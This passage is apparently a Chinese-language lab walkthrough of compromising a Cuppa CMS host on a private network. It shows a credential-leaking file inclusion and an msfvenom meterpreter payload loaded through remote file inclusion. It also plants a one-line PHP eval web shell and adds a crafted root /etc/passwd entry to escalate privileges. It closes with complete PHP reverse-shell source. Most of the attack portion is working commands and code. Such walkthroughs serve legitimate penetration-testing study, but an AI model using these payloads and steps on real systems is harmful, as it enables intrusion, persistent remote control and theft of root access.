-PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
------------------------------------------------------------------------------
-
-Base64 Decode Output:
------------------------------------------------------------------------------
-&lt;?php
-        class Configuration{
-                public <span class="hljs-variable">$host</span> = <span class="hljs-string">"localhost"</span>;
-                public <span class="hljs-variable">$db</span> = <span class="hljs-string">"cuppa"</span>;
-                public <span class="hljs-variable">$user</span> = <span class="hljs-string">"root"</span>;
-                public <span class="hljs-variable">$password</span> = <span class="hljs-string">"Db@dmin"</span>;
-                public <span class="hljs-variable">$table_prefix</span> = <span class="hljs-string">"cu_"</span>;
-                public <span class="hljs-variable">$administrator_template</span> = <span class="hljs-string">"default"</span>;
-                public <span class="hljs-variable">$list_limit</span> = 25;
-                public <span class="hljs-variable">$token</span> = <span class="hljs-string">"OBqIPqlFWf3X"</span>;
-                public <span class="hljs-variable">$allowed_extensions</span> = <span class="hljs-string">"*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx"</span>;
-                public <span class="hljs-variable">$upload_default_path</span> = <span class="hljs-string">"media/uploadsFiles"</span>;
-                public <span class="hljs-variable">$maximum_file_size</span> = <span class="hljs-string">"5242880"</span>;
-                public <span class="hljs-variable">$secure_login</span> = 0;
-                public <span class="hljs-variable">$secure_login_value</span> = <span class="hljs-string">""</span>;
-                public <span class="hljs-variable">$secure_login_redirect</span> = <span class="hljs-string">""</span>;
-        }
-?&gt;
------------------------------------------------------------------------------
-
-Able to <span class="hljs-built_in">read</span> sensitive information via File Inclusion (PHP Stream)
-
-<span class="hljs-comment">################################################################################################################</span>
- Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD <span class="hljs-variable">$ectors</span>, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
-<span class="hljs-comment">################################################################################################################</span></code></pre></div>
-<p>该exp有两个漏洞点，一个本地文件包含读文件，一个远程文件包含</p>
-<p>那我们开启kali http服务，并制作一个反弹shell木马，让靶机对其进行包含</p>
-<p>msfvenom生成一个php木马</p>
-<div><pre class="hljs"><code>msfvenom -p php/meterpreter_reverse_tcp lhost=192.168.56.123 lport=4444 -f raw &gt; shell.php</code></pre></div>
-<p>接下来开启4444端口监听并对该php木马进行文件包含并开启</p>
-<p><code>http://192.168.56.15/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://192.168.56.123/shell.php</code></p>
-<p>成功获取到shell</p>
-<img src="/_resources/9d637bee723949ba95880d4340cb8d12.png" alt="86335f5a32486fdcb09cb011adeb5253.png" width="933" height="510" class="jop-noMdConv" />
-<p>接下来尝试提权，该主机为linux，那么尝试进习惯SUID提权</p>
-<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
-<div><pre class="hljs"><code>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null
-/usr/bin/cp
-/usr/bin/chfn
-/usr/bin/chsh
-/usr/bin/fusermount
-/usr/bin/chage
-/usr/bin/gpasswd
-/usr/bin/newgrp
-/usr/bin/sudo
-/usr/bin/mount
-/usr/bin/su
-/usr/bin/umount
-/usr/bin/Xorg
-/usr/bin/pkexec
-/usr/bin/crontab
-/usr/bin/passwd
-/usr/bin/ksu
-/usr/bin/at
-/usr/bin/staprun
-/usr/sbin/pam_timestamp_check
-/usr/sbin/unix_chkpwd
-/usr/sbin/usernetctl
-/usr/sbin/userhelper
-/usr/sbin/mount.nfs
-/usr/lib/polkit-1/polkit-agent-helper-1
-/usr/libexec/dbus-1/dbus-daemon-launch-helper
-/usr/libexec/flatpak-bwrap
-/usr/libexec/sssd/krb5_child
-/usr/libexec/sssd/ldap_child
-/usr/libexec/sssd/selinux_child
-/usr/libexec/sssd/proxy_child
-/usr/libexec/qemu-bridge-helper
-/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
-/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
-sh-4.2$</code></pre></div>
-<p>发现cp命令可以root身份免密码使用</p>
-<p>考虑自己制作一个root用户并添加至/etc/passwd文件中</p>
-<p>先读取/etc/passwd文件</p>
-<div><pre class="hljs"><code>root:x:0:0:root:/root:/bin/bash
-bin:x:1:1:bin:/bin:/sbin/nologin
-daemon:x:2:2:daemon:/sbin:/sbin/nologin
-adm:x:3:4:adm:/var/adm:/sbin/nologin
-lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
-sync:x:5:0:sync:/sbin:/bin/sync
-shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
-halt:x:7:0:halt:/sbin:/sbin/halt
-mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
-operator:x:11:0:operator:/root:/sbin/nologin
-games:x:12:100:games:/usr/games:/sbin/nologin
-ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
-nobody:x:99:99:Nobody:/:/sbin/nologin
-systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
-dbus:x:81:81:System message bus:/:/sbin/nologin
-polkitd:x:999:998:User <span class="hljs-keyword">for</span> polkitd:/:/sbin/nologin
-sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
-postfix:x:89:89::/var/spool/postfix:/sbin/nologin
-chrony:x:998:996::/var/lib/chrony:/sbin/nologin
-david:x:1000:1000:david:/home/david:/bin/bash
-apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
-tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
-geoclue:x:997:995:User <span class="hljs-keyword">for</span> geoclue:/var/lib/geoclue:/sbin/nologin
-mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
-nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
-rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
-libstoragemgmt:x:995:991:daemon account <span class="hljs-keyword">for</span> libstoragemgmt:/var/run/lsm:/sbin/nologin
-gluster:x:994:990:GlusterFS daemons:/var/run/gluster:/sbin/nologin
-unbound:x:993:989:Unbound DNS resolver:/etc/unbound:/sbin/nologin
-qemu:x:107:107:qemu user:/:/sbin/nologin
-usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
-rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
-colord:x:992:988:User <span class="hljs-keyword">for</span> colord:/var/lib/colord:/sbin/nologin
-ntp:x:38:38::/etc/ntp:/sbin/nologin
-abrt:x:173:173::/etc/abrt:/sbin/nologin
-saslauth:x:991:76:Saslauthd user:/run/saslauthd:/sbin/nologin
-pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
-sssd:x:990:984:User <span class="hljs-keyword">for</span> sssd:/:/sbin/nologin
-rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
-nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
-radvd:x:75:75:radvd user:/:/sbin/nologin
-gdm:x:42:42::/var/lib/gdm:/sbin/nologin
-setroubleshoot:x:989:983::/var/lib/setroubleshoot:/sbin/nologin
-gnome-initial-setup:x:988:982::/run/gnome-initial-setup/:/sbin/nologin
-tcpdump:x:72:72::/:/sbin/nologin
-avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
-ossec:x:1001:1002::/var/ossec:/sbin/nologin
-ossecm:x:1002:1002::/var/ossec:/sbin/nologin
-ossecr:x:1003:1002::/var/ossec:/sbin/nologin
-rick:x:1004:1004::/home/rick:/bin/bash</code></pre></div>
-<p>我们在/var/www/html目录下做一个一句话木马然后使用蚁剑连接</p>
-<div><pre class="hljs"><code>sh-4.2$ <span class="hljs-built_in">pwd</span>        
-/var/www/html
-<span class="hljs-built_in">pwd</span>
-sh-4.2$ <span class="hljs-built_in">echo</span> <span class="hljs-string">'&lt;?php @eval($_POST[cmd]);?&gt;'</span> &gt; ./hack.php
-<span class="hljs-built_in">echo</span> <span class="hljs-string">'&lt;?php @eval($_POST[cmd]);?&gt;'</span> &gt; ./hack.php
-sh-4.2$ cat hack.php
-cat hack.php
-&lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);?&gt;</code></pre></div>
-<img src="/_resources/6b188f260f524de8a6003e0fd8b7091a.png" alt="610f6f7b3b2ed6e0fbb95a07bb789f29.png" width="1062" height="281" class="jop-noMdConv" />
-<p>制作一个passwd文件，其中内容为靶机的passwd文件，并将做好的root身份用户添加至passwd文件末尾，上传至靶机然后cp替代靶机的/etc/passwd文件</p>
-<p>制作的用户为<code>sob:$1$sob$BmJLmGFTRiB9Pzlip0Dpa0:0:0::/root:/bin/bash</code></p>
-<img src="/_resources/f54ed671330340fc8214d0b8fae10ce0.png" alt="8c894480caeb99dac32a2f501f433ad5.png" width="972" height="349" class="jop-noMdConv" />
-<p>最后成功提权</p>
-<p><img src="/_resources/9a4bbec05bc0427a8e3aeb5f729c0618.png" alt="23a904f907c03a6807414c6d5d2c4455.png" width="962" height="768" class="jop-noMdConv" /> <img src="/_resources/6f9a6a034663463d9bbc36a119353741.png" alt="8b4e596af7da646be8fb1456be2c657e.png" width="840" height="584" class="jop-noMdConv" /></p>
-<hr />
-<p>PS:这里贴一下用到的php反弹shell</p>
-<div><pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
-
-<span class="hljs-comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span>
-
-set_time_limit (<span class="hljs-number">0</span>);
-<span class="hljs-variable">$VERSION</span> = <span class="hljs-string">"1.0"</span>;
-<span class="hljs-variable">$ip</span> = <span class="hljs-string">'192.168.56.123'</span>;  <span class="hljs-comment">// CHANGE THIS</span>
-<span class="hljs-variable">$port</span> = <span class="hljs-number">4444</span>;       <span class="hljs-comment">// CHANGE THIS</span>
-<span class="hljs-variable">$chunk_size</span> = <span class="hljs-number">1400</span>;
-<span class="hljs-variable">$write_a</span> = <span class="hljs-literal">null</span>;
-<span class="hljs-variable">$error_a</span> = <span class="hljs-literal">null</span>;
-<span class="hljs-variable">$shell</span> = <span class="hljs-string">'uname -a; w; id; /bin/sh -i'</span>;
-<span class="hljs-variable">$daemon</span> = <span class="hljs-number">0</span>;
-<span class="hljs-variable">$debug</span> = <span class="hljs-number">0</span>;
-
-<span class="hljs-comment">//</span>
-<span class="hljs-comment">// Daemonise ourself if possible to avoid zombies later</span>
-<span class="hljs-comment">//</span>
-
-<span class="hljs-comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span>
-<span class="hljs-comment">// our php process and avoid zombies.  Worth a try...</span>
-<span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">'pcntl_fork'</span>)) {
-    <span class="hljs-comment">// Fork and have the parent process exit</span>
-    <span class="hljs-variable">$pid</span> = pcntl_fork();
-    
-    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -<span class="hljs-number">1</span>) {
-        printit(<span class="hljs-string">"ERROR: Can't fork"</span>);
-        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
-    }
-    
-    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) {
-        <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// Parent exits</span>
-    }
-
-    <span class="hljs-comment">// Make the current process a session leader</span>
-    <span class="hljs-comment">// Will only succeed if we forked</span>
-    <span class="hljs-keyword">if</span> (posix_setsid() == -<span class="hljs-number">1</span>) {
-        printit(<span class="hljs-string">"Error: Can't setsid()"</span>);
-        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
-    }
-
-    <span class="hljs-variable">$daemon</span> = <span class="hljs-number">1</span>;
-} <span class="hljs-keyword">else</span> {
-    printit(<span class="hljs-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span>);
-}
-
-<span class="hljs-comment">// Change to a safe directory</span>
-chdir(<span class="hljs-string">"/"</span>);
-
-<span class="hljs-comment">// Remove any umask we inherited</span>
-umask(<span class="hljs-number">0</span>);
-
-<span class="hljs-comment">//</span>
-<span class="hljs-comment">// Do the reverse shell...</span>
-<span class="hljs-comment">//</span>
-
-<span class="hljs-comment">// Open reverse connection</span>
-<span class="hljs-variable">$sock</span> = fsockopen(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);
-<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) {
-    printit(<span class="hljs-string">"<span class="hljs-subst">$errstr</span> (<span class="hljs-subst">$errno</span>)"</span>);
-    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
-}
-
-<span class="hljs-comment">// Spawn shell process</span>
-<span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(
-   <span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"r"</span>),  <span class="hljs-comment">// stdin is a pipe that the child will read from</span>
-   <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>),  <span class="hljs-comment">// stdout is a pipe that the child will write to</span>
-   <span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>)   <span class="hljs-comment">// stderr is a pipe that the child will write to</span>
-);
-
-<span class="hljs-variable">$process</span> = proc_open(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);
-
-<span class="hljs-keyword">if</span> (!is_resource(<span class="hljs-variable">$process</span>)) {
-    printit(<span class="hljs-string">"ERROR: Can't spawn shell"</span>);
-    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
-}
-
-<span class="hljs-comment">// Set everything to non-blocking</span>
-<span class="hljs-comment">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span>
-stream_set_blocking(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>);
-stream_set_blocking(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);
-stream_set_blocking(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>);
-stream_set_blocking(<span class="hljs-variable">$sock</span>, <span class="hljs-number">0</span>);
-
-printit(<span class="hljs-string">"Successfully opened reverse shell to <span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>"</span>);
-
-<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
-    <span class="hljs-comment">// Check for end of TCP connection</span>
-    <span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$sock</span>)) {
-        printit(<span class="hljs-string">"ERROR: Shell connection terminated"</span>);
-        <span class="hljs-keyword">break</span>;
-    }
-
-    <span class="hljs-comment">// Check for end of STDOUT</span>
-    <span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) {
-        printit(<span class="hljs-string">"ERROR: Shell process terminated"</span>);
-        <span class="hljs-keyword">break</span>;
-    }
-
-    <span class="hljs-comment">// Wait until a command is end down $sock, or some</span>
-    <span class="hljs-comment">// command output is available on STDOUT or STDERR</span>
-    <span class="hljs-variable">$read_a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);
-    <span class="hljs-variable">$num_changed_sockets</span> = stream_select(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, <span class="hljs-literal">null</span>);
-
-    <span class="hljs-comment">// If we can read from the TCP socket, send</span>
-    <span class="hljs-comment">// data to process's STDIN</span>
-    <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) {
-        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"SOCK READ"</span>);
-        <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>);
-        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"SOCK: <span class="hljs-subst">$input</span>"</span>);
-        fwrite(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-variable">$input</span>);
-    }
-
-    <span class="hljs-comment">// If we can read from the process's STDOUT</span>
-    <span class="hljs-comment">// send data down tcp connection</span>
-    <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$read_a</span>)) {
-        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDOUT READ"</span>);
-        <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$chunk_size</span>);
-        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDOUT: <span class="hljs-subst">$input</span>"</span>);
-        fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);
-    }
-
-    <span class="hljs-comment">// If we can read from the process's STDERR</span>
-    <span class="hljs-comment">// send data down tcp connection</span>
-    <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$read_a</span>)) {
-        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDERR READ"</span>);
-        <span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$chunk_size</span>);
-        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">"STDERR: <span class="hljs-subst">$input</span>"</span>);
-        fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);
-    }
-}
-
-fclose(<span class="hljs-variable">$sock</span>);
-fclose(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>]);
-fclose(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);
-fclose(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);
-proc_close(<span class="hljs-variable">$process</span>);
-
-<span class="hljs-comment">// Like print, but does nothing if we've daemonised ourself</span>
-<span class="hljs-comment">// (I can't figure out how to redirect STDOUT like a proper daemon)</span>
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printit</span> (<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>{
-    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) {
-        <span class="hljs-keyword">print</span> <span class="hljs-string">"<span class="hljs-subst">$string</span>\n"</span>;
-    }
-}
-
-<span class="hljs-meta">?&gt;</span></code></pre></div>
 ]]></content:encoded>
         </item>
     </channel>
